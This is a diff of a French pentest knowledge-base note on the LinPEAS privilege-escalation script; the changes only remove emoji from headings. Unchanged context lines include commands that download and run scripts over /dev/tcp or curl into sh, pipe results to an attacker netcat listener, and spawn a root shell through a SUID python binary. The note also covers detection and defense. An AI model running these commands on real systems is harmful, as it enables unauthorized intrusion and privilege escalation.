@@ -1,11 +1,11 @@
 ---
 title: "Outil - LinPeas"
 type: outil
-categorie: 💥 Exploitation & Cracking
+categorie: Exploitation & Cracking
 tags:
   - cyber
   - outil
-  - 💥 Exploitation & Cracking
+  - Exploitation & Cracking
 statut: publie
 version: rolling (ex. 20251215)
 licence: GPLv3
@@ -16,14 +16,14 @@ site: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index
 doc: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 ---
 
-# 👑 LinPeas — Escalade de privilèges Linux
+# LinPeas — Escalade de privilèges Linux
 
 > [!info] **En 1 phrase**
 > LinPEAS (Linux Privilege Escalation Awesome Script) est le script d'énumération de référence pour l'escalade de privilèges Linux : il agglomère en un passage tous les checkers classiques et classe les résultats par urgence, en couleur.
 
 ---
 
-## 🧾 Overview
+## Overview
 
 LinPEAS fait partie de la suite **PEASS-ng** (github.com/peass-ng/PEASS-ng, ~19 000 étoiles), écrite par Carlos Polop (HackTricks), qui inclut aussi WinPEAS (Windows). C'est un script **bash unique** — des variantes `linpeas.sh` (par défaut), `linpeas_fat.sh` (tous les checks + apps tierces embarquées en base64) et `linpeas_small.sh` (checks essentiels seulement) — exécuté depuis la cible sans installation.
 
@@ -41,7 +41,7 @@ Le projet publie des **releases rolling** datées (ex. `20251215`). La version d
 
 ---
 
-## 🎯 Concept
+## Concept
 
 LinPEAS fait partie de la suite **PEASS-ng** (carlospolop), qui inclut aussi WinPEAS pour Windows. C'est un script bash unique qui lance en une exécution des dizaines de vérifications ciblant les faiblesses classiques d'escalade de privilèges Linux : **SUID/SGID**, **sudo** (via `sudo -l` et les binaires GTFOBins), **capabilités** de fichiers, **cron** et jobs planifiés, fichiers/dossiers **writable** dans des chemins critiques, historiques et fichiers contenant des **identifiants** (config, `id_rsa`, `.bash_history`, clés de déploiement), **conteneurs/Docker** (sortie de conteneur, images), et faiblesses de noyau.
 
@@ -62,7 +62,7 @@ flowchart LR
 
 ---
 
-## 🧠 Concepts fondamentaux
+## Concepts fondamentaux
 
 ### Les catégories de checks
 
@@ -92,7 +92,7 @@ On peut aussi **builder son propre linpeas** en sélectionnant les checks souhai
 
 ---
 
-## 🛠️ Installation
+## Installation
 
 Aucune installation requise : télécharger et exécuter.
 
@@ -127,7 +127,7 @@ cat < /dev/tcp/10.10.10.10/80 | sh   # Cible
 
 ---
 
-## ⚙️ Configuration
+## Configuration
 
 LinPEAS est sans fichier de configuration : tout se fait par options en ligne de commande. Le script décide lui-même de ce qu'il peut lire selon les privilèges courants (UID, capacité de `sudo -l`...).
 
@@ -137,7 +137,7 @@ LinPEAS est sans fichier de configuration : tout se fait par options en ligne de
 
 ---
 
-## 🏗️ Architecture interne
+## Architecture interne
 
 LinPEAS est un gros script bash auto-contenu qui procède par blocs de checks séquentiels :
 
@@ -165,7 +165,7 @@ Des **parsers** (répertoire `parsers/` du dépôt) convertissent la sortie en J
 
 ---
 
-## ⌨️ Commandes
+## Commandes
 
 ```bash
 # Exécution complète (tous les checks)
@@ -187,7 +187,7 @@ Des **parsers** (répertoire `parsers/` du dépôt) convertissent la sortie en J
 ./linpeas.sh -a | tee /tmp/linpeas.log
 ```
 
-## 🎚️ Options et flags
+## Options et flags
 
 | Option | Effet |
 |---|---|
@@ -209,7 +209,7 @@ Des **parsers** (répertoire `parsers/` du dépôt) convertissent la sortie en J
 
 ---
 
-## 🧪 Exemples pratiques
+## Exemples pratiques
 
 ### Exécution complète avec sortie en fichier
 ```bash
@@ -232,7 +232,7 @@ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
 
 ---
 
-## 🧪 Workflow complet (scénario pas à pas)
+## Workflow complet (scénario pas à pas)
 
 1. **Upload** sur la cible via ta session (base64, wget, ou la session C2) :
    ```bash
@@ -252,7 +252,7 @@ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
 
 ---
 
-## 🎬 Scénarios avancés
+## Scénarios avancés
 
 ### Scénario 1 : SUID + GTFOBins
 LinPEAS liste un binaire SUID (`-rwsr-xr-x /usr/bin/python3`). Croiser avec gtfobins.github.io : exécuter
@@ -284,7 +284,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ---
 
-## 🛡️ Cybersecurity use cases
+## Cybersecurity use cases
 
 ### Pentest / Red team
 - **Étape post-exploitation systématique** : après un premier accès (www-data, user limité), LinPEAS cartographie les vecteurs d'escalade en une passe.
@@ -300,7 +300,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ---
 
-## 🎯 MITRE ATT&CK
+## MITRE ATT&CK
 
 | Technique | ID | Rôle de LinPEAS |
 |---|---|---|
@@ -316,7 +316,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ---
 
-## 🛡️ Defensive Security
+## Defensive Security
 
 | Signe | Défense |
 |---|---|
@@ -329,7 +329,7 @@ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 ---
 
-## 🤖 Automatisation
+## Automatisation
 
 ### Exécution et archivage systématique
 ```bash
@@ -353,7 +353,7 @@ curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.s
 
 ---
 
-## 📤 Output et parsing
+## Output et parsing
 
 - **Sortie couleur** : relue avec `less -r` pour conserver les couleurs.
 - **Fichier texte** : redirection `>` ou `-a > fichier`.
@@ -378,7 +378,7 @@ LinPEAS
 
 ---
 
-## 🔗 Intégrations
+## Intégrations
 
 | Outil | Intégration |
 |---|---|
@@ -391,7 +391,7 @@ LinPEAS
 
 ---
 
-## 🔄 Alternatives
+## Alternatives
 
 | Outil | Différence avec LinPEAS |
 |---|---|
@@ -403,7 +403,7 @@ LinPEAS
 
 ---
 
-## ⚡ Performance
+## Performance
 
 - **`-s` (superfast)** : quelques secondes à une minute, idéal en premier passage.
 - **`-a` (tous)** : de quelques dizaines de secondes à plusieurs minutes selon le système.
@@ -416,7 +416,7 @@ LinPEAS
 
 ---
 
-## 🛠️ Troubleshooting
+## Troubleshooting
 
 | Problème | Cause probable | Solution |
 |---|---|---|
@@ -429,7 +429,7 @@ LinPEAS
 
 ---
 
-## 🔐 Sécurité de l'outil
+## Sécurité de l'outil
 
 - **Licence** : GPLv3, open source, code inspectable.
 - **Confidentialité** : le script tourne en local ; la sortie (informations système, users, chemins) est renvoyée à l'attaquant — en usage défensif, garder ces rapports hors de tout dépôt partagé.
@@ -438,7 +438,7 @@ LinPEAS
 
 ---
 
-## ⚠️ Limitations
+## Limitations
 
 - **Faux positifs** : un candidat rouge n'est pas toujours exploitable ; confirmation manuelle obligatoire.
 - **Faux négatifs** : il rate des vecteurs (scripts custom, logique applicative métier).
@@ -448,7 +448,7 @@ LinPEAS
 
 ---
 
-## 📋 Cheatsheet
+## Cheatsheet
 
 ```bash
 # Télécharger + exécuter (one-liner)
@@ -474,7 +474,7 @@ less -r out.txt
 wget .../linpeas_linux_amd64 && ./linpeas_linux_amd64
 ```
 
-## ⚡ Quick reference
+## Quick reference
 
 | Besoin | Commande |
 |---|---|
@@ -489,7 +489,7 @@ wget .../linpeas_linux_amd64 && ./linpeas_linux_amd64
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Signe | Défense |
 |---|---|
@@ -501,16 +501,16 @@ wget .../linpeas_linux_amd64 && ./linpeas_linux_amd64
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Tips**
+> [!tip] **Tips**
 > - **Sauvegarde toujours la sortie** (`tee`) : relire le rapport calmement et le croiser avec `pspy` révèle plus que la sortie en direct.
 > - Priorise le **rouge**, mais ne néglige pas le jaune : c'est souvent là que se cachent les pivots longs mais solides.
 > - Exécute d'abord `-s` (rapide) pour un premier plan d'action, puis `-d` en fond si tu as le temps — l'ordre inverse fait perdre du temps.
 > - `less -r` sur un fichier de sortie garde les couleurs : lis le rapport à tête reposée plutôt qu'en direct.
 > - Sur une cible sans outils (`curl`/`wget`), passe par `/dev/tcp` ou le base64 : `cat < /dev/tcp/<IP>/80 | sh`.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - LinPEAS est un **agrégateur**, pas un oracle : il rate des choses et remonte des faux positifs — chaque piste doit être confirmée manuellement.
 > - Le mode `-r` (regex) est **très lent** sur les gros filesystems et très bruyant : à éviter sur une cible sous surveillance.
 > - La plupart des checks ne nécessitent pas root, mais certains (`-e`, lecture de fichiers sensibles) **échouent sans privilèges** : une sortie « propre » ne signifie pas un système sain.
@@ -518,21 +518,21 @@ wget .../linpeas_linux_amd64 && ./linpeas_linux_amd64
 
 ---
 
-## 📚 References
+## References
 
 ### Official
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > - [GitHub PEASS-ng](https://github.com/peass-ng/PEASS-ng)
 > - [LinPEAS README](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 > - [Releases PEASS-ng](https://github.com/peass-ng/PEASS-ng/releases)
 > - [Kali — paquet peass-ng](https://www.kali.org/tools/peass-ng/)
 
 ### Security & Community
-> [!info] 📚 **Ressources complémentaires**
+> [!info] **Ressources complémentaires**
 > - [HackTricks — Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
 > - [GTFOBins (binaires abusables)](https://gtfobins.github.io/)
 > - [MITRE ATT&CK — T1548 Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
 
 ---
 
-➡️ **Liens :** [[Tools|🧰 Outils]] · [[Techniques/Privilege Escalation Linux|Privilege Escalation Linux]] · [[Techniques/Privilege Escalation Windows|Privilege Escalation Windows]] · [[Outils/Outil - Metasploit|Metasploit]]
+**Liens :** [[Tools| Outils]] · [[Techniques/Privilege Escalation Linux|Privilege Escalation Linux]] · [[Techniques/Privilege Escalation Windows|Privilege Escalation Windows]] · [[Outils/Outil - Metasploit|Metasploit]]
